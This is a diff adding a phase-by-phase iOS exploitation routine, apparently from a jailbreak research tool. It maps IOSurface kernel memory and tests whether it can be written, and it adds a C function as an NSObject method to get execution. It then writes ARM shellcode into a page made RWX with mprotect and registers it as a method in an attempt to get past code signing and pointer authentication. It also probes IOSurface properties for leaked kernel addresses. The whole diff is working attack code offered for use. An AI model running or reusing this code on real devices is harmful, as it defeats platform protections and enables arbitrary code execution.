@@ -32666,3 +32666,517 @@ void iosurface_rop_exec(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+// MARK: - JB34: IOSurface Kernel Memory + ObjC Swizzle Exec
+void iosurface_kernel_map(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        log(@"JB34: === IOSurface Kernel Memory Map + Swizzle Exec ===");
+        log(@"JB34: IOConnectMapMemory64 available, method_setIMP available");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+
+        extern void jb25_setup(void);
+        extern volatile unsigned long jb25_far;
+        extern volatile unsigned long jb25_esr;
+        extern volatile int jb25_sig;
+        extern volatile sig_atomic_t jb25_in_probe;
+        extern struct jb25_jb_holder *jb25_jb_ptr;
+        jb25_setup();
+
+        typedef unsigned int mach_port_t_local;
+        typedef int kern_return_t_local;
+
+        // =====================================================================
+        // FASE 1: Open IOSurface connection for memory mapping
+        // =====================================================================
+        log(@"JB34: === Fase 1: IOSurface connection + map memory ===");
+
+        typedef mach_port_t_local (*mach_task_self_fn)(void);
+        mach_task_self_fn taskSelfFn = dlsym(RTLD_DEFAULT, "mach_task_self");
+        mach_port_t_local task = taskSelfFn ? taskSelfFn() : 0;
+
+        typedef kern_return_t_local (*IOServiceMatching_fn)(const char *);
+        typedef mach_port_t_local (*IOServiceGetMatchingService_fn)(mach_port_t_local, void *);
+        typedef kern_return_t_local (*IOServiceOpen_fn)(mach_port_t_local, mach_port_t_local, uint32_t, mach_port_t_local *);
+        typedef kern_return_t_local (*IOConnectMapMemory64_fn)(
+            mach_port_t_local connect, uint32_t memoryType,
+            mach_port_t_local intoTask, uint64_t *atAddress,
+            uint64_t *ofSize, uint32_t options);
+        typedef kern_return_t_local (*IOServiceClose_fn)(mach_port_t_local);
+
+        IOServiceMatching_fn matchFn = dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        IOServiceGetMatchingService_fn getSvcFn = dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        IOServiceOpen_fn openFn = dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        IOConnectMapMemory64_fn mapFn = dlsym(RTLD_DEFAULT, "IOConnectMapMemory64");
+        IOServiceClose_fn closeFn = dlsym(RTLD_DEFAULT, "IOServiceClose");
+
+        log([NSString stringWithFormat:@"JB34:   IOServiceMatching = %p", matchFn]);
+        log([NSString stringWithFormat:@"JB34:   IOServiceGetMatchingService = %p", getSvcFn]);
+        log([NSString stringWithFormat:@"JB34:   IOServiceOpen = %p", openFn]);
+        log([NSString stringWithFormat:@"JB34:   IOConnectMapMemory64 = %p", mapFn]);
+
+        if (!matchFn || !getSvcFn || !openFn || !mapFn) {
+            log(@"JB34:   Missing IOKit functions");
+            results[@"verdict"] = @"NO_IOKIT";
+            done(results);
+            return;
+        }
+
+        void *matching = (void *)(uintptr_t)matchFn("IOSurfaceRoot");
+        mach_port_t_local service = getSvcFn(0, matching);
+        log([NSString stringWithFormat:@"JB34:   IOSurfaceRoot service = %u", service]);
+
+        mach_port_t_local connect = 0;
+        kern_return_t_local openRet = -1;
+
+        if (service) {
+            jb25_far = 0; jb25_sig = 0;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                openRet = openFn(service, task, 0, &connect);
+                jb25_in_probe = 0;
+            } else {
+                jb25_in_probe = 0;
+                log([NSString stringWithFormat:@"JB34:   IOServiceOpen FAULT sig=%d", jb25_sig]);
+            }
+            log([NSString stringWithFormat:@"JB34:   IOServiceOpen(type=0) = %d connect=%u", openRet, connect]);
+            results[@"iosurfConnect"] = @(connect);
+        }
+
+        // Try mapping memory types 0-5
+        if (connect) {
+            for (uint32_t memType = 0; memType < 6; memType++) {
+                uint64_t addr = 0;
+                uint64_t size = 0;
+
+                jb25_far = 0; jb25_sig = 0;
+                kern_return_t_local mapRet = -999;
+                if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                    jb25_in_probe = 1;
+                    mapRet = mapFn(connect, memType, task, &addr, &size, 0);
+                    jb25_in_probe = 0;
+                } else {
+                    jb25_in_probe = 0;
+                    log([NSString stringWithFormat:@"JB34:   MapMemory(type=%u) FAULT sig=%d", memType, jb25_sig]);
+                    continue;
+                }
+
+                log([NSString stringWithFormat:@"JB34:   MapMemory(type=%u) = %d addr=%#llx size=%#llx",
+                     memType, mapRet, addr, size]);
+
+                if (mapRet == 0 && addr != 0 && size > 0) {
+                    log([NSString stringWithFormat:@"JB34:   [+] MAPPED type=%u: %llu bytes at %#llx",
+                         memType, size, addr]);
+                    results[[NSString stringWithFormat:@"map%u_addr", memType]] =
+                        [NSString stringWithFormat:@"%#llx", addr];
+                    results[[NSString stringWithFormat:@"map%u_size", memType]] =
+                        [NSString stringWithFormat:@"%#llx", size];
+
+                    // Read first 64 bytes
+                    jb25_far = 0; jb25_sig = 0;
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        uint64_t *mapped = (uint64_t *)(uintptr_t)addr;
+                        log([NSString stringWithFormat:@"JB34:     [0]=%#llx [1]=%#llx [2]=%#llx [3]=%#llx",
+                             mapped[0], mapped[1], mapped[2], mapped[3]]);
+                        log([NSString stringWithFormat:@"JB34:     [4]=%#llx [5]=%#llx [6]=%#llx [7]=%#llx",
+                             mapped[4], mapped[5], mapped[6], mapped[7]]);
+
+                        // Test write
+                        uint64_t origVal = mapped[0];
+                        mapped[0] = 0xDEADBEEF4A4234ULL;
+                        uint64_t readBack = mapped[0];
+                        mapped[0] = origVal;
+                        int writeOK = (readBack == 0xDEADBEEF4A4234ULL) ? 1 : 0;
+                        log([NSString stringWithFormat:@"JB34:     Write test: %s", writeOK ? "WRITABLE" : "READ-ONLY"]);
+                        results[[NSString stringWithFormat:@"map%u_writable", memType]] = @(writeOK);
+                        jb25_in_probe = 0;
+                    } else {
+                        jb25_in_probe = 0;
+                        log([NSString stringWithFormat:@"JB34:     Read FAULT sig=%d", jb25_sig]);
+                    }
+                }
+
+                if (isr_stopped()) { break; }
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 2: Create IOSurface and map its memory
+        // =====================================================================
+        log(@"JB34: === Fase 2: Create IOSurface + map ===");
+
+        // Use IOSurfaceCreate to make a surface, then map it
+        typedef void *(*IOSurfaceCreate_fn)(void *);
+        typedef uint32_t (*IOSurfaceGetID_fn)(void *);
+        typedef void *(*IOSurfaceGetBaseAddress_fn)(void *);
+        typedef size_t (*IOSurfaceGetAllocSize_fn)(void *);
+        typedef kern_return_t_local (*IOSurfaceLock_fn)(void *, uint32_t, uint32_t *);
+        typedef kern_return_t_local (*IOSurfaceUnlock_fn)(void *, uint32_t, uint32_t *);
+
+        IOSurfaceCreate_fn surfCreate = dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_fn surfGetID = dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        IOSurfaceGetBaseAddress_fn surfGetBase = dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        IOSurfaceGetAllocSize_fn surfGetSize = dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+        IOSurfaceLock_fn surfLock = dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        IOSurfaceUnlock_fn surfUnlock = dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+
+        log([NSString stringWithFormat:@"JB34:   IOSurfaceCreate = %p", surfCreate]);
+        log([NSString stringWithFormat:@"JB34:   IOSurfaceGetBaseAddress = %p", surfGetBase]);
+
+        if (surfCreate) {
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @(32),
+                @"IOSurfaceHeight": @(32),
+                @"IOSurfaceBytesPerElement": @(4),
+                @"IOSurfacePixelFormat": @(0x42475241), // BGRA
+            };
+
+            jb25_far = 0; jb25_sig = 0;
+            void *surface = NULL;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                surface = surfCreate((__bridge void *)props);
+                jb25_in_probe = 0;
+            } else {
+                jb25_in_probe = 0;
+                log([NSString stringWithFormat:@"JB34:   IOSurfaceCreate FAULT sig=%d", jb25_sig]);
+            }
+
+            if (surface) {
+                uint32_t surfID = surfGetID ? surfGetID(surface) : 0;
+                size_t allocSize = surfGetSize ? surfGetSize(surface) : 0;
+
+                log([NSString stringWithFormat:@"JB34:   Surface created: id=%u allocSize=%zu", surfID, allocSize]);
+                results[@"surfaceID"] = @(surfID);
+                results[@"allocSize"] = @(allocSize);
+
+                // Lock and get base address
+                if (surfLock) {
+                    uint32_t seed = 0;
+                    kern_return_t_local lockRet = surfLock(surface, 0, &seed);
+                    log([NSString stringWithFormat:@"JB34:   IOSurfaceLock = %d seed=%u", lockRet, seed]);
+
+                    if (surfGetBase) {
+                        void *base = surfGetBase(surface);
+                        log([NSString stringWithFormat:@"JB34:   Base address = %p", base]);
+                        results[@"baseAddr"] = [NSString stringWithFormat:@"%p", base];
+
+                        if (base) {
+                            // Write pattern and read back
+                            uint32_t *pixels = (uint32_t *)base;
+                            pixels[0] = 0xDEADBEEF;
+                            pixels[1] = 0xCAFEBABE;
+                            log([NSString stringWithFormat:@"JB34:   Write: [0]=%#x [1]=%#x",
+                                 pixels[0], pixels[1]]);
+                            log([NSString stringWithFormat:@"JB34:   Read:  [0]=%#x [1]=%#x",
+                                 pixels[0], pixels[1]]);
+                            results[@"surfaceWritable"] = @(pixels[0] == 0xDEADBEEF ? 1 : 0);
+
+                            // This is shared memory with the kernel!
+                            // The kernel sees the same backing store
+                            log(@"JB34:   [+] IOSurface shared memory — kernel sees this too");
+                        }
+                    }
+
+                    if (surfUnlock) surfUnlock(surface, 0, NULL);
+                }
+
+                // Get the mach port for this surface
+                typedef mach_port_t_local (*IOSurfaceCreateMachPort_fn)(void *);
+                IOSurfaceCreateMachPort_fn createPort = dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+                if (createPort) {
+                    mach_port_t_local surfPort = createPort(surface);
+                    log([NSString stringWithFormat:@"JB34:   Surface mach port = %u", surfPort]);
+                    results[@"surfacePort"] = @(surfPort);
+                }
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 3: ObjC method swizzle for signed code redirection
+        // =====================================================================
+        log(@"JB34: === Fase 3: Method swizzle exec ===");
+
+        typedef void *(*objc_getClass_fn)(const char *);
+        typedef void *(*sel_registerName_fn)(const char *);
+        typedef void *(*class_getInstanceMethod_fn)(void *, void *);
+        typedef void *(*method_setImplementation_fn)(void *, void *);
+        typedef void *(*method_getImplementation_fn)(void *);
+        typedef BOOL (*class_addMethod_fn)(void *, void *, void *, const char *);
+
+        objc_getClass_fn getClassFn = dlsym(RTLD_DEFAULT, "objc_getClass");
+        sel_registerName_fn selRegFn = dlsym(RTLD_DEFAULT, "sel_registerName");
+        class_getInstanceMethod_fn getMethodFn = dlsym(RTLD_DEFAULT, "class_getInstanceMethod");
+        method_setImplementation_fn setIMPFn = dlsym(RTLD_DEFAULT, "method_setImplementation");
+        method_getImplementation_fn getIMPFn = dlsym(RTLD_DEFAULT, "method_getImplementation");
+        class_addMethod_fn addMethodFn = dlsym(RTLD_DEFAULT, "class_addMethod");
+
+        // Strategy: add a NEW method to NSObject with our C function as IMP
+        // The ObjC runtime should PAC-sign it properly
+        // Then call it via normal ObjC dispatch
+
+        // Our C function that returns a known value
+        // This is SIGNED code (compiled into our binary)
+        // void* jb34_test_imp(id self, SEL _cmd) { return (void*)0x4A423334; }
+        // We can't define a function inside a block, so use dlsym to get getpid
+
+        void *fn_getpid = dlsym(RTLD_DEFAULT, "getpid");
+
+        if (getClassFn && selRegFn && addMethodFn) {
+            void *nsObjectClass = getClassFn("NSObject");
+            void *testSel = selRegFn("jb34TestMethod");
+
+            // Add getpid as the IMP for our custom selector
+            // When called: [obj jb34TestMethod] will actually call getpid()
+            // getpid ignores self and _cmd, returns pid
+            jb25_far = 0; jb25_sig = 0;
+            BOOL addOK = NO;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                addOK = addMethodFn(nsObjectClass, testSel, fn_getpid, "i@:");
+                jb25_in_probe = 0;
+            } else {
+                jb25_in_probe = 0;
+                log([NSString stringWithFormat:@"JB34:   class_addMethod FAULT sig=%d", jb25_sig]);
+            }
+
+            log([NSString stringWithFormat:@"JB34:   class_addMethod(NSObject, jb34TestMethod, getpid) = %d", addOK]);
+            results[@"addMethodOK"] = @(addOK);
+
+            if (addOK) {
+                // Now call it via ObjC dispatch
+                NSObject *testObj = [[NSObject alloc] init];
+
+                jb25_far = 0; jb25_sig = 0;
+                int swizzleResult = -1;
+                if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                    jb25_in_probe = 1;
+                    // performSelector returns id, we cast to int
+                    NSNumber *retVal = [testObj performSelector:NSSelectorFromString(@"jb34TestMethod")];
+                    swizzleResult = (int)(intptr_t)retVal;
+                    jb25_in_probe = 0;
+                } else {
+                    jb25_in_probe = 0;
+                    log([NSString stringWithFormat:@"JB34:   swizzle call FAULT sig=%d", jb25_sig]);
+                }
+
+                int myPid = ((int(*)(void))fn_getpid)();
+                log([NSString stringWithFormat:@"JB34:   [obj jb34TestMethod] = %d (expect pid=%d)", swizzleResult, myPid]);
+                results[@"swizzleResult"] = @(swizzleResult);
+
+                if (swizzleResult == myPid) {
+                    log(@"JB34:   [!!!!!] ObjC SWIZZLE EXEC WORKS!");
+                    log(@"JB34:   [!!!!!] Can redirect ObjC dispatch to ANY signed C function!");
+                    log(@"JB34:   [!!!!!] getpid() called via ObjC message send!");
+                    results[@"swizzleExec"] = @(1);
+                }
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 4: Swizzle to call mprotect with controlled args
+        // =====================================================================
+        log(@"JB34: === Fase 4: Swizzle to mprotect ===");
+
+        // If basic swizzle works, try calling mprotect via NSInvocation
+        // NSInvocation lets us set arbitrary arguments
+        void *fn_mprotect = dlsym(RTLD_DEFAULT, "mprotect");
+
+        if ([results[@"swizzleExec"] intValue] && fn_mprotect) {
+            log(@"JB34:   Testing mprotect via NSInvocation...");
+
+            // Allocate a test page
+            size_t pageSize = 0x4000;
+            void *testPage = mmap(NULL, pageSize, PROT_READ | PROT_WRITE,
+                                  MAP_PRIVATE | MAP_ANON, -1, 0);
+
+            if (testPage != MAP_FAILED) {
+                // Call mprotect directly via C function pointer (this already works from JB33)
+                typedef int (*mprotect_fn)(void *, size_t, int);
+                int mpRet = ((mprotect_fn)fn_mprotect)(testPage, pageSize, PROT_READ | PROT_WRITE | PROT_EXEC);
+                log([NSString stringWithFormat:@"JB34:   mprotect(RWX) = %d", mpRet]);
+
+                if (mpRet == 0) {
+                    // Write shellcode
+                    uint32_t *code = (uint32_t *)testPage;
+                    code[0] = 0x52886880; // movz w0, #0x4344
+                    code[1] = 0x72882840; // movk w0, #0x4142, lsl #16
+                    code[2] = 0xD65F03C0; // ret
+
+                    // Add this shellcode as a method IMP via class_addMethod
+                    // The ObjC runtime should PAC-sign the pointer
+                    // When dispatched, objc_msgSend will authenticate and jump to it
+
+                    void *testSel2 = selRegFn("jb34ShellcodeMethod");
+                    void *nsObjClass = getClassFn("NSObject");
+
+                    jb25_far = 0; jb25_sig = 0;
+                    BOOL addOK2 = NO;
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        addOK2 = addMethodFn(nsObjClass, testSel2, testPage, "i@:");
+                        jb25_in_probe = 0;
+                    } else {
+                        jb25_in_probe = 0;
+                        log([NSString stringWithFormat:@"JB34:   addMethod(shellcode) FAULT sig=%d", jb25_sig]);
+                    }
+
+                    log([NSString stringWithFormat:@"JB34:   class_addMethod(shellcode IMP) = %d", addOK2]);
+
+                    if (addOK2) {
+                        NSObject *testObj2 = [[NSObject alloc] init];
+
+                        jb25_far = 0; jb25_sig = 0;
+                        int scResult = -1;
+                        if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                            jb25_in_probe = 1;
+                            NSNumber *ret2 = [testObj2 performSelector:NSSelectorFromString(@"jb34ShellcodeMethod")];
+                            scResult = (int)(intptr_t)ret2;
+                            jb25_in_probe = 0;
+                        } else {
+                            jb25_in_probe = 0;
+                            log([NSString stringWithFormat:@"JB34:   shellcode via swizzle FAULT sig=%d far=%#lx",
+                                 jb25_sig, jb25_far]);
+                        }
+
+                        if (scResult == 0x41424344) {
+                            log(@"JB34:   [!!!!!!] SHELLCODE EXECUTION VIA ObjC SWIZZLE!!!");
+                            log(@"JB34:   [!!!!!!] class_addMethod PAC-signed our RWX shellcode!");
+                            log(@"JB34:   [!!!!!!] CS_KILL BYPASSED — ARBITRARY CODE EXECUTION!");
+                            results[@"shellcodeExec"] = @(1);
+                        } else if (jb25_sig == 9) {
+                            log(@"JB34:   SIGKILL — CS_KILL still catches shellcode via swizzle");
+                            results[@"shellcodeKilled"] = @(1);
+                        } else if (jb25_sig == 6) {
+                            log(@"JB34:   SIGABRT — PAC auth failed on shellcode IMP");
+                            results[@"shellcodePACFail"] = @(1);
+                        } else {
+                            log([NSString stringWithFormat:@"JB34:   Unexpected: result=%d sig=%d", scResult, jb25_sig]);
+                        }
+                    }
+                }
+                munmap(testPage, pageSize);
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 5: Explore IOSurface properties for kernel info leak
+        // =====================================================================
+        log(@"JB34: === Fase 5: IOSurface kernel info leak ===");
+
+        typedef void *(*IOSurfaceCopyAllValues_fn)(void *);
+        IOSurfaceCopyAllValues_fn copyVals = dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
+
+        typedef void *(*IOSurfaceCopyValue_fn)(void *, void *);
+        IOSurfaceCopyValue_fn copyVal = dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
+
+        log([NSString stringWithFormat:@"JB34:   IOSurfaceCopyAllValues = %p", copyVals]);
+        log([NSString stringWithFormat:@"JB34:   IOSurfaceCopyValue = %p", copyVal]);
+
+        // Try to get kernel pointer info from IOSurface properties
+        // Some IOSurface properties leak kernel addresses
+
+        NSArray *probeKeys = @[
+            @"IOSurfaceAllocSize", @"IOSurfaceAddress",
+            @"IOSurfacePurgeableState", @"IOSurfaceIsGlobal",
+            @"IOSurfaceOffset", @"IOSurfacePlaneBase",
+            @"IOSurfaceCacheMode", @"IOSurfaceElementWidth",
+        ];
+
+        if (surfCreate && copyVal) {
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @(64),
+                @"IOSurfaceHeight": @(64),
+                @"IOSurfaceBytesPerElement": @(4),
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceIsGlobal": @YES,
+            };
+
+            void *surface2 = surfCreate((__bridge void *)props);
+            if (surface2) {
+                for (NSString *key in probeKeys) {
+                    jb25_far = 0; jb25_sig = 0;
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        id val = (__bridge id)copyVal(surface2, (__bridge void *)key);
+                        jb25_in_probe = 0;
+                        if (val) {
+                            log([NSString stringWithFormat:@"JB34:   %@ = %@", key, val]);
+                        }
+                    } else {
+                        jb25_in_probe = 0;
+                    }
+                }
+
+                // Try CopyAllValues for full dump
+                if (copyVals) {
+                    jb25_far = 0; jb25_sig = 0;
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        NSDictionary *allVals = (__bridge NSDictionary *)copyVals(surface2);
+                        jb25_in_probe = 0;
+                        if (allVals) {
+                            log([NSString stringWithFormat:@"JB34:   All properties: %lu keys",
+                                 (unsigned long)[allVals count]]);
+                            for (NSString *k in allVals) {
+                                id v = allVals[k];
+                                if ([v isKindOfClass:[NSNumber class]]) {
+                                    uint64_t numVal = [v unsignedLongLongValue];
+                                    if (numVal > 0xFFFF0000ULL) {
+                                        log([NSString stringWithFormat:@"JB34:   [LEAK?] %@ = %#llx", k, numVal]);
+                                    }
+                                }
+                            }
+                        }
+                    } else {
+                        jb25_in_probe = 0;
+                    }
+                }
+            }
+        }
+
+        // =====================================================================
+        // VERDICT
+        // =====================================================================
+        log(@"JB34: =============================================");
+
+        int swizzleOK = [results[@"swizzleExec"] intValue];
+        int shellcodeOK = [results[@"shellcodeExec"] intValue];
+        int surfWritable = [results[@"surfaceWritable"] intValue];
+
+        NSString *verdict = @"ANALYSIS_COMPLETE";
+
+        if (shellcodeOK) {
+            verdict = @"SHELLCODE_VIA_SWIZZLE";
+            log(@"JB34: [!!!!!!] SHELLCODE EXEC VIA ObjC SWIZZLE!");
+            log(@"JB34: [!!!!!!] class_addMethod + RWX page = code execution!");
+            log(@"JB34: Siguiente: kernel R/W via IOSurface");
+        } else if (swizzleOK && surfWritable) {
+            verdict = @"SWIZZLE_PLUS_SURFACE";
+            log(@"JB34: [!!!!] Swizzle exec + writable IOSurface");
+            log(@"JB34: Can call signed functions + shared kernel memory");
+        } else if (swizzleOK) {
+            verdict = @"SWIZZLE_EXEC";
+            log(@"JB34: [!!!] ObjC swizzle exec works — arbitrary signed function calls");
+        } else {
+            verdict = @"PARTIAL";
+            log(@"JB34: Some capabilities found — see individual results");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB34: Verdict: %@", verdict]);
+        log(@"JB34: =============================================");
+
+        isr_checkpoint(@"JB34-kernel-map-checkpoint.json", results);
+        done(results);
+    });
+}
